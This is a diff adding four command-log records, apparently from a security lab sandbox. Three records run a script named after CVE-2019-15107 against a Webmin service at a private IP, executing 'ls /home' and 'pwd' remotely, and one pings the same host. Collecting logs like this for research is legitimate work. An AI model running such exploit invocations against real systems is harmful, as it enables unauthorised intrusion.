@@ -1,0 +1,4 @@
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:37:06.793882+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home'"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:37:12.731546+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home'"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:37:23.437470+02:00", "cmd_type": "bash-command", "cmd": "ping 172.18.1.5"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:37:34.078649+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'pwd'"}
